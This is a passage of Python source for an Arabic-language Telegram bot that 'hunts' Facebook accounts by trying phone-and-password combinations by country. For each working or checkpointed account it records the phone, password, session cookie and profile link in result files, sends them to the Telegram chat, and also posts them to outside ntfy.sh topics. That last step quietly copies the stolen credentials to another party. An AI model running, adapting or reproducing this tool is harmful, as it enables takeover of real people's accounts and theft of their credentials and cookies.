                        f.write(f"{phone}|{pas}\nCookie: {cookie_string}\nLink: https://www.facebook.com/profile.php?id={idd}\nApps: {apps}|{dates}\nExpired: {apps2}|{dates2}\nBY: @salhpy\nResponse: {json.dumps(response)}\n{'-'*40}\n")
                    
                    try:
                        requests.post("https://ntfy.sh/salh_ok", data=msg.encode('utf-8'), timeout=5)
                    except:
                        pass
                except:
                    pass
            
            elif 'www.facebook.com' in str(response):
                session.cp += 1
                try:
                    idd = response.get('error', {}).get('error_data', {}).get('uid', '?')
                    msg = f"""ACCUONT CP
phone: {phone}
pas: {pas}
ID=https://www.facebook.com/profile.php?id={idd}
DEV: @salhpy
Brother: @Xvxsa
BY https://t.me/S_S_lN
DEV @salhpy

Response: {json.dumps(response)}"""
                    await bot.send_message(chat_id=chat_id, text=msg)
                    
                    with open(f"{fc}/Salh_CP.txt", 'a') as f:
                        f.write(f"{phone}|{pas}\n link https://www.facebook.com/profile.php?id={idd}\n BY https://t.me/salhpy\n Response: {json.dumps(response)}\n ")
                    
                    try:
                        requests.post("https://ntfy.sh/salh_cp", data=msg.encode('utf-8'), timeout=5)
                    except:
                        pass
                except:
                    pass
            else:
                session.bad += 1
            
            await asyncio.sleep(0.5)
    
    progress_task = asyncio.create_task(update_progress(session, bot, chat_id))
    await hunt_loop()
    progress_task.cancel()
    try: await progress_task
    except: pass

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    e_saddam = emoji("5778447196152142000", "😎")
    text = f"""{emoji("5942913575658985039", "👋")} <b>اهلا بك في بوت صيد الفيسبوك</b>

{emoji("5325773891015045842", "📧")} <b>تشكير صيد حسابات فيسبوك جميع الدول</b>

{emoji("5372878077250519677", "👨‍💻")} <b>Dev : @salhpy {e_saddam}</b>"""
    buttons = build_main_buttons()
    await send_colored_buttons(update.message.chat.id, text, buttons)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat.id
    await query.answer()
    
    if query.data == "start_hunt":
        if user_id in user_sessions and user_sessions[user_id].is_running:
            await query.answer("الصيد شغال بالفعل")
            return
        session = CheckerSession(user_id)
        session.country = "1"
        user_sessions[user_id] = session
        
        text = format_stats(session)
        buttons = [[{"text": "ايقاف الصيد", "callback_data": "stop_hunt", "style": "danger", "icon_custom_emoji_id": "5870734657384877785"}]]
        result = await send_colored_buttons(chat_id, text, buttons)
        if result and result.get('ok'):
            session.progress_msg_id = result.get('result', {}).get('message_id')
        
        asyncio.create_task(run_hunt(session, context.bot, chat_id))
    
    elif query.data == "stop_hunt":
        if user_id in user_sessions and user_sessions[user_id].is_running:
            user_sessions[user_id].is_running = False
            await query.edit_message_text("تم ايقاف الصيد\n" + format_stats(user_sessions[user_id]), parse_mode="HTML")
        else:
            await query.edit_message_text("لا يوجد صيد نشط", parse_mode="HTML")
    
    elif query.data == "change_country":
        text = f"{emoji('5942988509953398699', '👇')} <b>اختر الدولة:</b>"
        await send_colored_buttons(chat_id, text, build_country_buttons(), message_id=query.message.message_id)
    
    elif query.data.startswith("c_"):
        country = query.data.split("_")[1]
        names = {"1":"العراق","2":"فلسطين","3":"مصر","4":"السعودية","5":"الاردن","6":"سوريا","7":"لبنان","8":"المغرب","9":"الجزائر","10":"تونس","11":"ليبيا","12":"السودان","13":"اليمن","14":"الكويت","15":"الامارات","16":"قطر","17":"البحرين","18":"عمان","19":"عشوائي"}
        eid, fb = COUNTRY_EMOJIS.get(country, ("5911382442622587735", "🇮🇶"))
        e = emoji(eid, fb)
        await query.edit_message_text(f"تم اختيار: {e} {names.get(country, '?')}", parse_mode="HTML")
        
        if user_id in user_sessions and user_sessions[user_id].is_running:
            user_sessions[user_id].country = country
    
    elif query.data == "balance":
        s = user_sessions.get(user_id, CheckerSession(user_id))
        await query.edit_message_text(f"OK: {s.hit}\nCP: {s.cp}\nBAD: {s.bad}", parse_mode="HTML")
    
    elif query.data == "info_menu":
     e_saddam = emoji("5778447196152142000", "😎")
     e_friend = emoji("5328170336737323856", "👤")
     e_channel = emoji("5328074404347801933", "📢")
     e_bot = emoji("5325901326989684588", "🤖")
     text = f"""{emoji('5327956885452649072', 'ℹ️')} <b>معلومات البوت</b>
	
	{e_bot} <b>بوت صيد فيسبوك</b>
	
	<b>المطور:</b> @salhpy {e_saddam}
	
	<b> Brother:</b> @Xvxsa {e_friend}
	
	<b>القناة:</b> https://t.me/Salhpyt {e_channel}"""
     buttons = [[{"text": "رجوع", "callback_data": "main_menu", "icon_custom_emoji_id": "6206505206197261313"}]]
     await send_colored_buttons(chat_id, text, buttons, message_id=query.message.message_id)
    
    elif query.data == "main_menu":
        text = f"""{emoji("5942913575658985039", "👋")} <b>القائمة الرئيسية</b>"""
        await send_colored_buttons(chat_id, text, build_main_buttons(), message_id=query.message.message_id)

def main():
    app = Application.builder().token(BOT_TOKEN).connect_timeout(60.0).read_timeout(60.0).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("تم تشغيل بوت صيد الفيسبوك...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    import requests
    Path("Results").mkdir(exist_ok=True)
    main()